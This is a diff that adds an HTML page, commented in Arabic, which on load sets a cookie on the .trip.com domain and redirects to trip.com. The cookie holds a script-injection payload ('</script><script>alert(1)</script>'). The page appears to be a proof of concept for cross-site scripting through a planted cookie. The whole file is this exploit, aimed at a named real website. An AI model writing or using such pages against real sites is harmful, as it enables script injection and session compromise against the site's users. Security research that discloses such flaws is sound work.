@@ -1,1 +1,46 @@
 <!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>Trip.com Redirect</title>
+    <script>
+        // ====== أنت تضع القيمة المطلوبة هنا ======
+        const MY_COOKIE_VALUE = '</script><script>alert(1)</script>';  // غيّر هذه القيمة كما تريد
+        // =======================================
+
+        const COOKIE_NAME = '_tp_search_latest_channel_name';
+
+        // دالة لجلب كل الكوكيز الحالية
+        function getAllCookies() {
+            return document.cookie;
+        }
+
+        // دالة لتعيين كوكي واحد
+        function setCookie(name, value) {
+            const expires = new Date(Date.now() + 30 * 86400000).toUTCString();
+            document.cookie = name + '=' + encodeURIComponent(value) + 
+                              '; expires=' + expires + 
+                              '; path=/; domain=.trip.com';
+        }
+
+        // التنفيذ الفوري
+        (function() {
+            // 1. نأخذ كل الكوكيز الموجودة (لنحتفظ بها)
+            const allCookies = getAllCookies();
+            console.log('🍪 جميع الكوكيز الموجودة:', allCookies);
+
+            // 2. نضيف/نعدل الكوكي المطلوب بالقيمة التي حددتها
+            setCookie(COOKIE_NAME, MY_COOKIE_VALUE);
+            console.log('✅ تم تعيين الكوكي:', COOKIE_NAME, '=', MY_COOKIE_VALUE);
+
+            // 3. تحويل مباشر للموقع
+            window.location.href = 'https://www.trip.com/';
+        })();
+    </script>
+</head>
+<body>
+    <p style="font-family: Arial; text-align: center; margin-top: 50px; color: #555;">
+        ⏳ جاري التحويل إلى Trip.com مع تعديل الكوكي...
+    </p>
+</body>
+</html>
